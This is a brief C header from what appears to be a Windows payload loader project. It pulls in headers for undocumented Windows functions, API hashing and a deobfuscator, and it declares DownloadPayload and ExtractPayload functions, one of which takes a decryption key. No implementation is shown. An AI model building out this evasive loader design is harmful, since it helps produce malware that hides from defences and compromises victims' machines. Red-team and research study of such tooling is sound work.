#pragma once
#include <windows.h>
#include "..\Customization.h"
#ifdef RESOURCE
#include "..\resource.h"
#endif
#include "UndocumentedStruct.h"
#include "UndocumentedFunctions.h"
#include "DocumentedFunctions.h"
#include "APIHashing.h"
#include "Deobfuscator.h"

#define INTERNET_OPEN_TYPE_PRECONFIG 0

void DownloadPayload(unsigned char** payload, SIZE_T* payload_len_ptr, unsigned char* key, SIZE_T key_len);
void ExtractPayload(unsigned char** payload, SIZE_T* payload_len_ptr);